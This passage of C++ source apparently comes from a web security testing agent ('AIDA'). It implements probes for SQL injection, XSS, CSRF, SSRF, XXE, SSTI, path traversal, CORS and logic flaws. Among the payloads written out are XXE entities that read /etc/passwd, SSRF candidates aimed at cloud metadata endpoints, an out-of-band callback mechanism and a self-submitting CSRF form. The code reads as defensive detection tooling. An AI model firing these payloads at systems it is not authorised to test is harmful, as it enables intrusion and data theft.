        a["param_location"] = m.location;
        if (sr.ok) {
            const std::string body = body_string(sr.exchange);
            a["response"] = response_summary(sr.exchange);
            a["marker_reflected"] = body.find("AIDA_UNION_" + std::to_string(cols)) != std::string::npos;
            std::vector<std::string> sql_labels;
            a["sql_error"] = response_has_sql_error(body, sql_labels);
            a["sql_error_labels"] = sql_labels;
            if (a["marker_reflected"].get<bool>() || a["sql_error"].get<bool>())
                found = true;
        } else {
            a["error"] = sr.error;
        }
        attempts.push_back(std::move(a));
        if (found)
            break;
    }
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["param_name"] = param;
    d["attempts"] = std::move(attempts);
    d["vulnerable"] = found;
    d["evidence_summary"] = found ? "union_marker_or_sql_error_observed" : "no_union_evidence";
    return tool_result_t::ok(found ? "SQLi UNION evidence observed" : "No SQLi UNION evidence observed", d);
}

tool_result_t tool_sqli_boolean_extract(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    const std::string true_payload = string_param(params, "true_payload", "1 AND 1=1");
    const std::string false_payload = string_param(params, "false_payload", "1 AND 1=2");
    mutation_t mt;
    auto rt = send_with_param(r, param, true_payload, params, &mt);
    mutation_t mf;
    auto rf = send_with_param(r, param, false_payload, params, &mf);
    json d;
    d["request"] = request_summary(r, mt.path_query.empty() ? r.target.path_query : mt.path_query);
    d["param_name"] = param;
    d["true_payload_hash"] = hash_string(true_payload);
    d["false_payload_hash"] = hash_string(false_payload);
    d["param_location"] = mt.location;
    if (!rt.ok || !rf.ok) {
        d["true_error"] = rt.error;
        d["false_error"] = rf.error;
        return tool_result_t::error("boolean SQLi probe transport failed", "transport_failed", d);
    }
    d["true_response"] = response_summary(rt.exchange);
    d["false_response"] = response_summary(rf.exchange);
    const long long delta = std::llabs(static_cast<long long>(rt.exchange.resp_body.size()) - static_cast<long long>(rf.exchange.resp_body.size()));
    const bool status_diff = rt.exchange.status_code != rf.exchange.status_code;
    const bool hash_diff = hash_bytes(rt.exchange.resp_body) != hash_bytes(rf.exchange.resp_body);
    const bool vulnerable = status_diff || (hash_diff && delta > 32);
    d["status_diff"] = status_diff;
    d["body_hash_diff"] = hash_diff;
    d["body_length_delta"] = delta;
    d["vulnerable"] = vulnerable;
    d["evidence_summary"] = vulnerable ? "true_false_response_delta_observed" : "no_boolean_delta";
    return tool_result_t::ok(vulnerable ? "Boolean SQLi differential evidence observed" : "No boolean SQLi differential evidence observed", d);
}

tool_result_t tool_sqli_time_extract(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    const int sleep_seconds = clamp_int_param(params, "sleep_seconds", 3, 1, 8);
    const std::string baseline_payload = string_param(params, "baseline_payload", "1");
    const std::string time_payload = string_param(params, "time_payload", "1 AND SLEEP(" + std::to_string(sleep_seconds) + ")");
    mutation_t mb;
    auto rb = send_with_param(r, param, baseline_payload, params, &mb);
    mutation_t mt;
    auto rt = send_with_param(r, param, time_payload, params, &mt);
    json d;
    d["request"] = request_summary(r, mb.path_query.empty() ? r.target.path_query : mb.path_query);
    d["param_name"] = param;
    d["sleep_seconds"] = sleep_seconds;
    d["baseline_payload_hash"] = hash_string(baseline_payload);
    d["time_payload_hash"] = hash_string(time_payload);
    d["param_location"] = mt.location;
    if (!rb.ok || !rt.ok) {
        d["baseline_error"] = rb.error;
        d["time_error"] = rt.error;
        return tool_result_t::error("time SQLi probe transport failed", "transport_failed", d);
    }
    d["baseline_response"] = response_summary(rb.exchange);
    d["time_response"] = response_summary(rt.exchange);
    const long long latency_delta = static_cast<long long>(rt.exchange.latency_ms) - static_cast<long long>(rb.exchange.latency_ms);
    const bool vulnerable = latency_delta >= static_cast<long long>(sleep_seconds * 700);
    d["latency_delta_ms"] = latency_delta;
    d["vulnerable"] = vulnerable;
    d["evidence_summary"] = vulnerable ? "sleep_latency_delta_observed" : "no_time_delay_evidence";
    return tool_result_t::ok(vulnerable ? "Time SQLi latency evidence observed" : "No time SQLi latency evidence observed", d);
}

tool_result_t tool_xss_detect_reflected(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    std::vector<std::string> payloads;
    if (params.contains("payloads") && params["payloads"].is_array()) {
        for (const auto& v : params["payloads"]) {
            if (v.is_string() && payloads.size() < 12)
                payloads.push_back(v.get<std::string>());
        }
    }
    if (payloads.empty())
        payloads = xss_payloads(static_cast<size_t>(clamp_int_param(params, "max_payloads", 6, 1, 12)));
    json attempts = json::array();
    bool reflected = false;
    for (const auto& payload : payloads) {
        if (call_expired()) break;
        mutation_t m;
        auto sr = send_with_param(r, param, payload, params, &m);
        json a;
        a["payload_hash"] = hash_string(payload);
        a["payload_length"] = payload.size();
        a["param_location"] = m.location;
        if (sr.ok) {
            const std::string body = body_string(sr.exchange);
            const bool exact = body.find(payload) != std::string::npos;
            const bool encoded_lt = body.find("&lt;") != std::string::npos && payload.find('<') != std::string::npos;
            a["response"] = response_summary(sr.exchange);
            a["reflected_exact"] = exact;
            a["html_encoded_nearby"] = encoded_lt;
            reflected = reflected || exact;
        } else {
            a["error"] = sr.error;
        }
        attempts.push_back(std::move(a));
        if (reflected)
            break;
    }
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["param_name"] = param;
    d["attempts"] = std::move(attempts);
    d["vulnerable"] = reflected;
    d["evidence_summary"] = reflected ? "payload_reflected_exactly" : "no_reflection_observed";
    return tool_result_t::ok(reflected ? "Reflected XSS evidence observed" : "No reflected XSS evidence observed", d);
}

tool_result_t tool_xss_detect_stored(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "POST"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    const std::string marker = "AIDA_STORED_XSS_" + hex_u64(now_ms());
    const std::string payload = string_param(params, "payload", "\"><svg id=\"" + marker + "\"></svg>");
    mutation_t m;
    auto submit = send_with_param(r, param, payload, params, &m);
    json d;
    d["submit_request"] = request_summary(r, m.path_query);
    d["param_name"] = param;
    d["payload_hash"] = hash_string(payload);
    d["marker_hash"] = hash_string(marker);
    d["param_location"] = m.location;
    if (!submit.ok) {
        d["submit_error"] = submit.error;
        return tool_result_t::error("stored XSS submit request failed", "transport_failed", d);
    }
    d["submit_response"] = response_summary(submit.exchange);
    prepared_request_t verify = r;
    if (params.contains("verify_url") && params["verify_url"].is_string()) {
        if (!parse_target_url(params["verify_url"].get<std::string>(), verify.target, err))
            return param_error(err, "verify_url");
        verify.method = "GET";
        verify.body.clear();
        verify.content_type.clear();
    }
    auto check = send_raw(verify, verify.target.path_query, verify.body, infer_content_type(verify));
    if (!check.ok) {
        d["verify_error"] = check.error;
        return tool_result_t::error("stored XSS verify request failed", "transport_failed", d);
    }
    const bool marker_found = body_string(check.exchange).find(marker) != std::string::npos;
    d["verify_request"] = request_summary(verify, verify.target.path_query);
    d["verify_response"] = response_summary(check.exchange);
    d["marker_observed"] = marker_found;
    d["vulnerable"] = marker_found;
    d["evidence_summary"] = marker_found ? "stored_marker_observed_on_verify_fetch" : "stored_marker_not_observed";
    return tool_result_t::ok(marker_found ? "Stored XSS marker observed" : "Stored XSS marker not observed", d);
}

tool_result_t tool_xss_generate_payloads(const json& params)
{
    const size_t max_count = static_cast<size_t>(clamp_int_param(params, "max_payloads", 12, 1, 64));
    json d;
    d["context"] = string_param(params, "context", "html");
    d["payloads"] = payload_json(xss_payloads(max_count));
    d["count"] = d["payloads"].size();
    return tool_result_t::ok(d);
}

std::vector<json> extract_csrf_tokens(const std::string& body)
{
    std::vector<json> out;
    try {
        static const std::regex input_re("<input\\b[^>]*>", std::regex_constants::icase);
        static const std::regex name_re("\\bname\\s*=\\s*['\"]([^'\"]+)['\"]", std::regex_constants::icase);
        static const std::regex value_re("\\bvalue\\s*=\\s*['\"]([^'\"]*)['\"]", std::regex_constants::icase);
        for (std::sregex_iterator it(body.begin(), body.end(), input_re), end; it != end && out.size() < 32; ++it) {
            const std::string input = it->str();
            std::smatch nm;
            if (!std::regex_search(input, nm, name_re))
                continue;
            const std::string name = nm[1].str();
            if (!is_sensitive_name(name) && !contains_ci(name, "csrf") && !contains_ci(name, "xsrf"))
                continue;
            std::string value;
            std::smatch vm;
            if (std::regex_search(input, vm, value_re))
                value = vm[1].str();
            json t;
            t["name"] = name;
            t["value_length"] = value.size();
            t["value_hash"] = hash_string(value);
            out.push_back(std::move(t));
        }
    } catch (...) {
    }
    return out;
}

size_t count_post_forms_without_csrf(const std::string& body)
{
    size_t count = 0;
    try {
        static const std::regex form_re("<form\\b[\\s\\S]*?</form>", std::regex_constants::icase);
        for (std::sregex_iterator it(body.begin(), body.end(), form_re), end; it != end; ++it) {
            const std::string form = lower_ascii(it->str());
            if (form.find("method=\"post\"") == std::string::npos && form.find("method='post'") == std::string::npos)
                continue;
            if (form.find("csrf") == std::string::npos && form.find("xsrf") == std::string::npos &&
                form.find("authenticity_token") == std::string::npos && form.find("requestverificationtoken") == std::string::npos)
                ++count;
        }
    } catch (...) {
    }
    return count;
}

tool_result_t tool_csrf_check_token(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    auto sr = send_raw(r, r.target.path_query, r.body, infer_content_type(r));
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    if (!sr.ok) {
        d["error"] = sr.error;
        return tool_result_t::error("CSRF token check request failed", "transport_failed", d);
    }
    const std::string body = body_string(sr.exchange);
    auto tokens = extract_csrf_tokens(body);
    const size_t missing_post_forms = count_post_forms_without_csrf(body);
    d["response"] = response_summary(sr.exchange);
    d["tokens"] = tokens;
    d["token_count"] = tokens.size();
    d["post_forms_without_token"] = missing_post_forms;
    d["vulnerable"] = missing_post_forms > 0;
    d["evidence_summary"] = missing_post_forms > 0 ? "post_forms_without_csrf_token" : (tokens.empty() ? "no_csrf_token_candidates" : "csrf_token_candidates_observed");
    return tool_result_t::ok(d["vulnerable"].get<bool>() ? "CSRF token weakness evidence observed" : "CSRF token candidates observed", d);
}

std::string html_escape(const std::string& s)
{
    std::string out;
    out.reserve(s.size());
    for (char c : s) {
        switch (c) {
        case '&': out += "&amp;"; break;
        case '<': out += "&lt;"; break;
        case '>': out += "&gt;"; break;
        case '"': out += "&quot;"; break;
        case '\'': out += "&#39;"; break;
        default: out.push_back(c); break;
        }
    }
    return out;
}

std::map<std::string, std::string> params_object_to_map(const json& p)
{
    std::map<std::string, std::string> out;
    if (!p.contains("params") || !p["params"].is_object())
        return out;
    for (auto it = p["params"].begin(); it != p["params"].end(); ++it) {
        if (it.value().is_string()) out[it.key()] = it.value().get<std::string>();
        else if (it.value().is_number_integer()) out[it.key()] = std::to_string(it.value().get<long long>());
        else if (it.value().is_number_unsigned()) out[it.key()] = std::to_string(it.value().get<unsigned long long>());
        else if (it.value().is_number_float()) out[it.key()] = std::to_string(it.value().get<double>());
        else if (it.value().is_boolean()) out[it.key()] = it.value().get<bool>() ? "true" : "false";
    }
    return out;
}

tool_result_t tool_csrf_generate_poc(const json& params)
{
    target_url_t target;
    std::string err;
    if (!params.contains("url") || !params["url"].is_string() || !parse_target_url(params["url"].get<std::string>(), target, err))
        return param_error(err.empty() ? "url is required" : err, "url");
    const std::string method = upper_ascii(string_param(params, "method", "POST"));
    auto fields = params_object_to_map(params);
    std::ostringstream html;
    html << "<!doctype html>\n<html><body>\n<form method=\"" << html_escape(method) << "\" action=\""
         << html_escape(redacted_url(target)) << "\">\n";
    json redacted_fields = json::array();
    for (const auto& kv : fields) {
        const bool sensitive = is_sensitive_name(kv.first);
        const std::string value = sensitive ? std::string("[redacted]") : kv.second;
        html << "<input type=\"hidden\" name=\"" << html_escape(kv.first) << "\" value=\"" << html_escape(value) << "\">\n";
        redacted_fields.push_back({{"name", kv.first}, {"value_redacted", sensitive}, {"value_hash", hash_string(kv.second)}, {"value_length", kv.second.size()}});
    }
    html << "<input type=\"submit\" value=\"Submit\">\n</form>\n<script>document.forms[0].submit();</script>\n</body></html>\n";
    json d;
    d["target"] = redacted_url(target);
    d["method"] = method;
    d["fields"] = std::move(redacted_fields);
    d["html"] = html.str();
    return tool_result_t::ok("CSRF PoC generated with sensitive values redacted", d);
}

struct oob_payload_t
{
    bool available = false;
    bool generated = false;
    std::string raw_url;
    std::string display_url;
    std::string token;
    std::string token_hash;
    std::string error;
};

oob_payload_t make_oob_payload(const json& params, const char* path_hint)
{
    oob_payload_t out;
    const std::string callback = string_param(params, "callback_url");
    if (!callback.empty()) {
        out.available = true;
        out.raw_url = callback;
        target_url_t parsed;
        std::string err;
        out.display_url = parse_target_url(callback, parsed, err) ? redacted_url(parsed) : std::string("<provided-callback>");
        return out;
    }
    try {
        const auto token = aida::burp::collaborator::generate_token();
        const auto cfg = aida::burp::collaborator::current_config();
        out.token = token;
        out.token_hash = hash_string(token);
        if (cfg.public_host.empty()) {
            out.error = "collaborator public_host is empty";
            return out;
        }
        std::string host = token + "." + cfg.public_host;
        out.raw_url = "http://" + host;
        if (cfg.http_port != 80 && cfg.http_port != 0)
            out.raw_url += ":" + std::to_string(cfg.http_port);
        out.raw_url += "/";
        out.raw_url += path_hint ? path_hint : "aida-oob";
        out.display_url = "http://<collaborator-token>." + cfg.public_host + "/";
        out.available = true;
        out.generated = true;
        return out;
    } catch (...) {
        out.error = "collaborator token generation failed";
        return out;
    }
}

json collaborator_poll_summary(const oob_payload_t& oob)
{
    json out;
    out["available"] = oob.available;
    out["generated"] = oob.generated;
    out["callback_url"] = oob.display_url;
    if (!oob.token_hash.empty())
        out["token_hash"] = oob.token_hash;
    if (!oob.error.empty())
        out["error"] = oob.error;
    if (oob.token.empty())
        return out;
    bounded_sleep_ms(1200);
    auto interactions = aida::burp::collaborator::poll_by_token(oob.token);
    json arr = json::array();
    for (const auto& ix : interactions) {
        json item;
        item["id"] = ix.id;
        item["kind"] = ix.kind;
        item["client_ip_hash"] = hash_string(ix.client_ip);
        item["client_port"] = ix.client_port;
        item["raw_length"] = ix.raw.size();
        arr.push_back(std::move(item));
    }
    out["interaction_count"] = interactions.size();
    out["interactions"] = std::move(arr);
    return out;
}

tool_result_t tool_ssrf_test(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    auto oob = make_oob_payload(params, "aida-ssrf");
    if (!oob.available)
        return tool_result_t::error("No collaborator callback URL available", "collaborator_unavailable", {{"error", oob.error}});
    mutation_t m;
    auto sr = send_with_param(r, param, oob.raw_url, params, &m);
    json d;
    d["request"] = request_summary(r, m.path_query);
    d["param_name"] = param;
    d["param_location"] = m.location;
    d["oob"] = collaborator_poll_summary(oob);
    if (!sr.ok) {
        d["error"] = sr.error;
        return tool_result_t::error("SSRF probe request failed", "transport_failed", d);
    }
    d["response"] = response_summary(sr.exchange);
    d["vulnerable"] = d["oob"].contains("interaction_count") && d["oob"]["interaction_count"].get<size_t>() > 0;
    d["evidence_summary"] = d["vulnerable"].get<bool>() ? "collaborator_interaction_observed" : "no_oob_interaction_observed";
    return tool_result_t::ok(d["vulnerable"].get<bool>() ? "SSRF OOB evidence observed" : "No SSRF OOB evidence observed", d);
}

tool_result_t tool_ssrf_scan_internal(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    std::vector<std::string> candidates;
    if (params.contains("candidates") && params["candidates"].is_array()) {
        for (const auto& v : params["candidates"]) {
            if (v.is_string() && candidates.size() < 16)
                candidates.push_back(v.get<std::string>());
        }
    }
    if (candidates.empty()) {
        candidates = {
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        };
    }
    const size_t limit = static_cast<size_t>(clamp_int_param(params, "max_candidates", 8, 1, 16));
    if (candidates.size() > limit)
        candidates.resize(limit);
    json attempts = json::array();
    bool evidence = false;
    for (const auto& candidate : candidates) {
        if (call_expired()) break;
        mutation_t m;
        auto sr = send_with_param(r, param, candidate, params, &m);
        json a;
        target_url_t parsed;
        std::string perr;
        a["candidate"] = parse_target_url(candidate, parsed, perr) ? redacted_url(parsed) : "<candidate>";
        a["candidate_hash"] = hash_string(candidate);
        a["param_location"] = m.location;
        if (sr.ok) {
            const std::string body = lower_ascii(body_string(sr.exchange));
            a["response"] = response_summary(sr.exchange);
            const bool metadata = body.find("ami-id") != std::string::npos ||
                                  body.find("instance-id") != std::string::npos ||
                                  body.find("computeMetadata") != std::string::npos ||
                                  body.find("metadata") != std::string::npos;
            a["metadata_indicator"] = metadata;
            evidence = evidence || metadata;
        } else {
            a["error"] = sr.error;
        }
        attempts.push_back(std::move(a));
    }
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["param_name"] = param;
    d["attempts"] = std::move(attempts);
    d["vulnerable"] = evidence;
    d["evidence_summary"] = evidence ? "internal_metadata_indicator_observed" : "no_internal_content_indicator";
    return tool_result_t::ok(evidence ? "SSRF internal content evidence observed" : "No SSRF internal content evidence observed", d);
}

std::vector<std::string> xxe_payloads_for(const std::string& callback)
{
    return {
        "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"" + callback + "\">]><a>&xxe;</a>",
        "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % ext SYSTEM \"" + callback + "\">%ext;]><a/>",
        "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><a>&xxe;</a>",
        "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><a>&xxe;</a>"
    };
}

tool_result_t tool_xxe_test(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "POST"))
        return param_error(err, "url");
    auto oob = make_oob_payload(params, "aida-xxe");
    const std::string callback = oob.available ? oob.raw_url : "http://127.0.0.1/aida-xxe";
    std::string body = string_param(params, "body_template");
    if (body.empty())
        body = xxe_payloads_for(callback).front();
    const size_t pos = body.find("{{CALLBACK}}");
    if (pos != std::string::npos)
        body.replace(pos, 12, callback);
    auto sr = send_raw(r, r.target.path_query, body, "application/xml");
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["payload_hash"] = hash_string(body);
    d["payload_length"] = body.size();
    d["oob"] = collaborator_poll_summary(oob);
    if (!sr.ok) {
        d["error"] = sr.error;
        return tool_result_t::error("XXE probe request failed", "transport_failed", d);
    }
    const std::string resp = lower_ascii(body_string(sr.exchange));
    const bool file_indicator = resp.find("root:x:") != std::string::npos || resp.find("[fonts]") != std::string::npos;
    const bool oob_hit = d["oob"].contains("interaction_count") && d["oob"]["interaction_count"].get<size_t>() > 0;
    d["response"] = response_summary(sr.exchange);
    d["file_indicator"] = file_indicator;
    d["vulnerable"] = file_indicator || oob_hit;
    d["evidence_summary"] = oob_hit ? "collaborator_interaction_observed" : (file_indicator ? "local_file_indicator_observed" : "no_xxe_evidence");
    return tool_result_t::ok(d["vulnerable"].get<bool>() ? "XXE evidence observed" : "No XXE evidence observed", d);
}

tool_result_t tool_xxe_generate_payloads(const json& params)
{
    const std::string callback = string_param(params, "callback_url", "http://collaborator.example/aida-xxe");
    auto payloads = xxe_payloads_for(callback);
    const size_t max_count = static_cast<size_t>(clamp_int_param(params, "max_payloads", 8, 1, 16));
    if (payloads.size() > max_count) payloads.resize(max_count);
    json d;
    d["payloads"] = payload_json(payloads);
    d["count"] = d["payloads"].size();
    return tool_result_t::ok(d);
}

tool_result_t tool_ssti_detect(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    const size_t max_payloads = static_cast<size_t>(clamp_int_param(params, "max_payloads", 5, 1, 12));
    auto payloads = ssti_payloads(max_payloads);
    json attempts = json::array();
    bool evidence = false;
    for (const auto& payload : payloads) {
        if (call_expired()) break;
        mutation_t m;
        auto sr = send_with_param(r, param, payload, params, &m);
        json a;
        a["payload_hash"] = hash_string(payload);
        a["param_location"] = m.location;
        if (sr.ok) {
            const std::string body = body_string(sr.exchange);
            const bool arithmetic = body.find("49") != std::string::npos || body.find("7777777") != std::string::npos;
            a["response"] = response_summary(sr.exchange);
            a["arithmetic_indicator"] = arithmetic;
            evidence = evidence || arithmetic;
        } else {
            a["error"] = sr.error;
        }
        attempts.push_back(std::move(a));
        if (evidence) break;
    }
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["param_name"] = param;
    d["attempts"] = std::move(attempts);
    d["vulnerable"] = evidence;
    d["evidence_summary"] = evidence ? "template_arithmetic_output_observed" : "no_ssti_evidence";
    return tool_result_t::ok(evidence ? "SSTI evidence observed" : "No SSTI evidence observed", d);
}

tool_result_t tool_ssti_generate_payloads(const json& params)
{
    const size_t max_count = static_cast<size_t>(clamp_int_param(params, "max_payloads", 16, 1, 64));
    json d;
    d["payloads"] = payload_json(ssti_payloads(max_count));
    d["count"] = d["payloads"].size();
    return tool_result_t::ok(d);
}

tool_result_t tool_path_traversal_test(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    const std::string platform = lower_ascii(string_param(params, "platform", "all"));
    auto payloads = traversal_payloads(platform, static_cast<size_t>(clamp_int_param(params, "max_payloads", 8, 1, 32)));
    json attempts = json::array();
    bool evidence = false;
    for (const auto& payload : payloads) {
        if (call_expired()) break;
        mutation_t m;
        auto sr = send_with_param(r, param, payload, params, &m);
        json a;
        a["payload_hash"] = hash_string(payload);
        a["param_location"] = m.location;
        if (sr.ok) {
            const std::string body = lower_ascii(body_string(sr.exchange));
            const bool unix_hit = body.find("root:x:") != std::string::npos;
            const bool win_hit = body.find("[fonts]") != std::string::npos || body.find("[extensions]") != std::string::npos;
            a["response"] = response_summary(sr.exchange);
            a["unix_file_indicator"] = unix_hit;
            a["windows_file_indicator"] = win_hit;
            evidence = evidence || unix_hit || win_hit;
        } else {
            a["error"] = sr.error;
        }
        attempts.push_back(std::move(a));
        if (evidence) break;
    }
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["param_name"] = param;
    d["attempts"] = std::move(attempts);
    d["vulnerable"] = evidence;
    d["evidence_summary"] = evidence ? "local_file_content_indicator_observed" : "no_path_traversal_evidence";
    return tool_result_t::ok(evidence ? "Path traversal evidence observed" : "No path traversal evidence observed", d);
}

tool_result_t tool_path_traversal_generate_payloads(const json& params)
{
    const std::string platform = lower_ascii(string_param(params, "platform", "all"));
    const size_t max_count = static_cast<size_t>(clamp_int_param(params, "max_payloads", 16, 1, 64));
    json d;
    d["payloads"] = payload_json(traversal_payloads(platform, max_count));
    d["count"] = d["payloads"].size();
    return tool_result_t::ok(d);
}

tool_result_t tool_open_redirect_test(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    r.follow_redirects = false;
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    const std::string redirect_url = string_param(params, "redirect_url", "https://aida.invalid/redirect-proof");
    mutation_t m;
    auto sr = send_with_param(r, param, redirect_url, params, &m);
    json d;
    d["request"] = request_summary(r, m.path_query);
    d["param_name"] = param;
    d["redirect_url_hash"] = hash_string(redirect_url);
    d["param_location"] = m.location;
    if (!sr.ok) {
        d["error"] = sr.error;
        return tool_result_t::error("open redirect probe failed", "transport_failed", d);
    }
    auto loc = header_value(sr.exchange.resp_headers, "Location");
    bool vulnerable = false;
    if (loc.has_value())
        vulnerable = starts_with_ci(*loc, redirect_url);
    d["response"] = response_summary(sr.exchange);
    d["location_present"] = loc.has_value();
    d["vulnerable"] = vulnerable;
    d["evidence_summary"] = vulnerable ? "location_header_matches_external_redirect" : "no_external_redirect_location";
    return tool_result_t::ok(vulnerable ? "Open redirect evidence observed" : "No open redirect evidence observed", d);
}

tool_result_t tool_cmdi_detect(const json& params)
{
    return run_scanner_wrapper(params, {"cmdi"}, "GET", "cmdi.detect");
}

tool_result_t tool_deser_test(const json& params)
{
    return run_scanner_wrapper(params, {"deserial"}, string_param(params, "method", "POST"), "deser.test");
}

tool_result_t tool_deser_generate_payloads(const json& params)
{
    const std::string format = lower_ascii(string_param(params, "format", "java"));
    std::vector<std::string> payloads;
    if (format == "java") {
        payloads = {"aced0005740009414944415f54455354", "rO0ABXQACUFJREFfVEVTVA=="};
    } else if (format == "php") {
        payloads = {"s:9:\"AIDA_TEST\";", "O:8:\"stdClass\":1:{s:4:\"aida\";s:4:\"test\";}"};
    } else if (format == "python") {
        payloads = {"gASVDAAAAAAAAACMCUFJREFfVEVTVJQu", "8004950c000000000000008c09414944415f54455354942e"};
    } else if (format == ".net" || format == "dotnet") {
        payloads = {"AAEAAAD/////AQAAAAAAAAAMAgAAAEFJREFfVEVTVA==", "{\"$type\":\"System.String\",\"$value\":\"AIDA_TEST\"}"};
    } else {
        payloads = {"AIDA_DESER_CANARY", "}{", "[]", "{}"};
    }
    const size_t max_count = static_cast<size_t>(clamp_int_param(params, "max_payloads", 8, 1, 16));
    if (payloads.size() > max_count)
        payloads.resize(max_count);
    json d;
    d["format"] = format;
    d["payloads"] = payload_json(payloads);
    d["count"] = d["payloads"].size();
    d["payload_kind"] = "non_executing_canary_and_format_probe";
    return tool_result_t::ok(d);
}

tool_result_t tool_race_test(const json& params)
{
    return run_scanner_wrapper(params, {"race_condition"}, string_param(params, "method", "POST"), "race.test");
}

tool_result_t tool_logic_test_idor(const json& params)
{
    return run_scanner_wrapper(params, {"idor"}, "GET", "logic.test_idor");
}

tool_result_t tool_logic_test_price_tamper(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "POST"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name", "price");
    const std::string original = string_param(params, "original_value", "100.00");
    const std::string tampered = string_param(params, "tampered_value", "0.01");
    mutation_t mb;
    auto rb = send_with_param(r, param, original, params, &mb);
    mutation_t mt;
    auto rt = send_with_param(r, param, tampered, params, &mt);
    json d;
    d["request"] = request_summary(r, mb.path_query);
    d["param_name"] = param;
    d["param_location"] = mb.location;
    d["original_value_hash"] = hash_string(original);
    d["tampered_value_hash"] = hash_string(tampered);
    if (!rb.ok || !rt.ok) {
        d["baseline_error"] = rb.error;
        d["tampered_error"] = rt.error;
        return tool_result_t::error("price tamper probe transport failed", "transport_failed", d);
    }
    d["baseline_response"] = response_summary(rb.exchange);
    d["tampered_response"] = response_summary(rt.exchange);
    const bool accepted = rt.exchange.status_code >= 200 && rt.exchange.status_code < 400;
    const bool similar_status = rb.exchange.status_code == rt.exchange.status_code;
    const long long delta = std::llabs(static_cast<long long>(rb.exchange.resp_body.size()) - static_cast<long long>(rt.exchange.resp_body.size()));
    const bool vulnerable = accepted && similar_status && delta < 256;
    d["accepted"] = accepted;
    d["similar_status"] = similar_status;
    d["body_length_delta"] = delta;
    d["vulnerable"] = vulnerable;
    d["evidence_summary"] = vulnerable ? "tampered_price_accepted_with_similar_response" : "no_price_tamper_acceptance_evidence";
    return tool_result_t::ok(vulnerable ? "Price tamper evidence observed" : "No price tamper evidence observed", d);
}

tool_result_t tool_cors_test(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string origin = string_param(params, "origin", "https://aida.invalid");
    auto sr = send_raw(r, r.target.path_query, r.body, infer_content_type(r), {{"Origin", origin}});
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["origin_hash"] = hash_string(origin);
    if (!sr.ok) {
        d["error"] = sr.error;
        return tool_result_t::error("CORS probe request failed", "transport_failed", d);
    }
    const auto acao = header_value(sr.exchange.resp_headers, "Access-Control-Allow-Origin");
    const auto acac = header_value(sr.exchange.resp_headers, "Access-Control-Allow-Credentials");
    const bool reflects = acao.has_value() && *acao == origin;
    const bool wildcard = acao.has_value() && *acao == "*";
    const bool credentials = acac.has_value() && lower_ascii(*acac) == "true";
    const bool vulnerable = reflects || (wildcard && credentials);
    d["response"] = response_summary(sr.exchange);
    d["acao_present"] = acao.has_value();
    d["acao_reflects_origin"] = reflects;
    d["acao_wildcard"] = wildcard;
    d["acac_true"] = credentials;
    d["vulnerable"] = vulnerable;
    d["evidence_summary"] = vulnerable ? "permissive_cors_header_observed" : "no_permissive_cors_header";
    return tool_result_t::ok(vulnerable ? "CORS misconfiguration evidence observed" : "No CORS misconfiguration evidence observed", d);
}

tool_result_t tool_cors_scan_origins(const json& params)
{
    json origins = params.contains("origins") && params["origins"].is_array() ? params["origins"] : json::array({"https://aida.invalid", "null", "https://evil.example"});
    json attempts = json::array();
    bool evidence = false;
    size_t count = 0;
    for (const auto& o : origins) {
        if (!o.is_string() || count >= 12 || call_expired())
            continue;
        json p = params;
        p["origin"] = o.get<std::string>();
